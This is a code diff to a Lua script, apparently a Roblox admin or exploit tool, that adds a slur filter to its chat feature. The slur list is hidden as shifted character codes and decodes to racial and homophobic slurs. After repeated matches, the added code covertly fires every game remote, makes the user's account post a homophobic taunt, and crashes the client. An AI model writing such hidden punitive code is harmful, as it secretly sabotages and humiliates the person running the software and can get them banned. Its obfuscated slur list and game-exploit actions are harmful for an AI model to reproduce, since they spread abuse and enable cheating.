@@ -50818,6 +50818,96 @@ originalIO.runNACHAT=function()
 			return bestMatch
 		end
 
+		local slurWarnings = {
+			"NA Chat: Slurs are blocked here",
+			"NA Chat: Drop the slurs",
+			"NA Chat: Keep it respectful",
+			"NA Chat: That language isn't welcome",
+			"NA Chat: Stop trying to type slurs",
+		}
+		local slurAttempts = 0
+		local slurPunishing = false
+
+		local leetMap = {
+			a = "[a4@]", b = "[b8]", c = "[c%(]", d = "d", e = "[e3]", f = "f",
+			g = "[g69]", h = "h", i = "[i1!|l]", j = "j", k = "k", l = "[l1|!]",
+			m = "m", n = "n", o = "[o0]", p = "p", q = "q", r = "r", s = "[s5$]",
+			t = "[t7+]", u = "[uv]", v = "[vu]", w = "w", x = "x", y = "y", z = "[z2]"
+		}
+
+		local encodedSlurs = {113,108,106,106,104,117,47,113,108,106,106,100,47,105,100,106,106,114,119,47,110,108,110,104,47,102,107,108,113,110,47,118,115,108,102,47,122,104,119,101,100,102,110,47,106,114,114,110,47,119,117,100,113,113,124,47,117,104,119,100,117,103,47,102,114,114,113}
+		local function decodeSlurList()
+			local chars = {}
+			for i, v in ipairs(encodedSlurs) do
+				chars[i] = string.char(v - 3)
+			end
+			local joined = Concat(chars)
+			local list = {}
+			for word in joined:gmatch("[^,]+") do
+				list[#list+1] = word
+			end
+			return list
+		end
+		local slurList = decodeSlurList()
+
+		local slurPatterns = {}
+		for _, word in ipairs(slurList) do
+			local parts = {}
+			word = word:lower()
+			for i = 1, #word do
+				local ch = word:sub(i, i)
+				parts[#parts+1] = leetMap[ch] or ch
+			end
+			slurPatterns[#slurPatterns+1] = Concat(parts, "[%W_]*")
+		end
+
+		local function isSlurAttempt(text)
+			if type(text) ~= "string" then
+				return false
+			end
+			local lower = Lower(text)
+			for _, pattern in ipairs(slurPatterns) do
+				if lower:match(pattern) then
+					return true
+				end
+			end
+			return false
+		end
+
+		local function warnSlur()
+			slurAttempts += 1
+			local warnMsg = slurWarnings[math.random(1, #slurWarnings)]
+			originalIO.setStatus(warnMsg, STATUS_COLORS.err)
+			if DoNotif then
+				DoNotif(warnMsg, 3)
+			end
+
+			if slurAttempts > 5 and not slurPunishing then
+				slurPunishing = true
+				Spawn(function()
+					local endTime = tick() + 10
+					while tick() < endTime do
+						pcall(function()
+							if cmd and cmd.run then
+								cmd.run({"fireremotes"})
+							end
+						end)
+						pcall(function()
+							if cmd and cmd.run then
+								cmd.run({"chat", "I LOVE MEN"})
+							end
+						end)
+						Wait(0.15)
+					end
+					pcall(function()
+						if cmd and cmd.run then
+							cmd.run({"crash"})
+						end
+					end)
+				end)
+			end
+		end
+
 		local function sendMessage(t)
 			if NAChat.isHidden then
 				originalIO.setStatus("NA Chat: Hidden (message not sent)", STATUS_COLORS.info)
@@ -50842,6 +50932,12 @@ originalIO.runNACHAT=function()
 
 			t = tostring(t):gsub("^%s+", ""):gsub("%s+$", "")
 			if t == "" then
+				return
+			end
+
+			if isSlurAttempt(t) then
+				warnSlur()
+				clearTyping()
 				return
 			end
 
